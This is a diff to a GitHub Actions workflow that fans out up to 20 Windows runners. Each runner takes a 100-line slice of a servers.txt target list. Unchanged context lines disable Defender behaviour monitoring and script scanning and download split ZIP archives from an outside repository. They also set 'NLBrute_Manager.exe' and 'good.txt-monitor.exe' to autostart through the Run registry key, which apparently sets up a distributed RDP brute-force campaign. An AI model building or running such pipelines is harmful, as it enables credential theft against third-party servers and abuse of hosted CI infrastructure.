@@ -12,7 +12,7 @@ jobs:
   deploy:
     strategy:
       matrix:
-        # This creates the parallel runs
+        # This defines the maximum capacity. The input 'total_servers' limits the active runs.
         server_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
       fail-fast: false
 
@@ -23,55 +23,61 @@ jobs:
       - name: 1. Checkout Repo
         uses: actions/checkout@v4
 
-      - name: 2. Setup Workspace & Identity
+      - name: 2. Setup Workspace & Validate Input
         shell: powershell
         run: |
+          $maxServers = [int]${{ github.event.inputs.total_servers }}
+          $currentId = ${{ matrix.server_id }}
           $workDir = "C:\target_app"
+
+          # Stop job if the matrix ID is higher than the user's requested amount
+          if ($currentId -gt $maxServers) {
+              Write-Host "Stopping Job: Server ID $currentId exceeds requested limit of $maxServers" -ForegroundColor Yellow
+              exit 0
+          }
+
+          # Prepare Workspace
           if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
           New-Item -ItemType Directory -Path $workDir -Force | Out-Null
           
-          echo "SERVER_ID=${{ matrix.server_id }}" >> $env:GITHUB_ENV
-          echo "MAX_SERVERS=${{ github.event.inputs.total_servers }}" >> $env:GITHUB_ENV
+          # Set Environment Variables for later steps
+          echo "SERVER_ID=$currentId" >> $env:GITHUB_ENV
+          echo "MAX_SERVERS=$maxServers" >> $env:GITHUB_ENV
           echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
           
-          Write-Host "Initializing Server ID: ${{ matrix.server_id }}" -ForegroundColor Cyan
+          Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan
 
-      - name: 3. Split servers.txt (Internal Logic)
+      - name: 3. Split servers.txt (Data Partitioning)
         shell: powershell
         run: |
           $maxServers = [int]$env:MAX_SERVERS
           $currentId = [int]$env:SERVER_ID
-          $inputFile = "servers.txt" # The ONE big file you uploaded
+          $inputFile = "${{ github.workspace }}\servers.txt" 
           $outputFile = "$($env:WORK_DIR)\servers.txt"
-          $linesPerServer = 100 # How many lines each server gets
+          $linesPerServer = 100 
 
-          if ($currentId -gt $maxServers) {
-              Write-Host "Skipping Server ID $currentId (Limit: $maxServers)" -ForegroundColor Yellow
-              exit 0
-          }
-
-          Write-Host "Reading master $inputFile for Server ID $currentId..." -ForegroundColor Cyan
+          Write-Host "Reading master file from: $inputFile" -ForegroundColor Cyan
           
           if (!(Test-Path $inputFile)) {
-              Write-Error "CRITICAL: $inputFile not found in repository! Upload it!"
+              Write-Error "CRITICAL: servers.txt not found in repository root!"
               exit 1
           }
 
-          # Read all lines from the big file
-          $allLines = Get-Content $inputFile
+          # Read all lines and filter out empty lines to ensure clean data
+          $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
           
           # Calculate the chunk for THIS server
           $startIndex = ($currentId - 1) * $linesPerServer
           $serverLines = $allLines | Select-Object -Skip $startIndex -First $linesPerServer
 
           if ($null -eq $serverLines -or $serverLines.Count -eq 0) {
-              Write-Error "No lines found for Server ID $currentId. Check your line count."
+              Write-Error "No lines found for Server ID $currentId. Check your input file line count."
               exit 1
           }
 
-          # Save the specific chunk as the local servers.txt that the app expects
-          $serverLines | Out-File -FilePath $outputFile -Encoding ascii
-          Write-Host "Successfully extracted chunk for Server $currentId to servers.txt" -ForegroundColor Green
+          # Save the specific chunk to the app directory
+          $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
+          Write-Host "Successfully extracted $($serverLines.Count) lines for Server $currentId to $outputFile" -ForegroundColor Green
 
       - name: 4. Enable RDP & Firewall
         run: |
@@ -115,7 +121,7 @@ jobs:
           Set-MpPreference -DisableBehaviorMonitoring $true
           Set-MpPreference -DisableScriptScanning $true
 
-          # 2. Download Split ZIPs (The Wrapper)
+          # 2. Download Split ZIPs
           $filesToDownload = @(
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z01",
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z02",
@@ -149,7 +155,7 @@ jobs:
               }
           }
 
-          # 4. Targeted Search and Registry Injection (GUI & Monitor)
+          # 4. Targeted Search and Registry Injection
           $targetExe1 = "NLBrute_Manager.exe"
           $targetExe2 = "good.txt-monitor.exe"
           $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
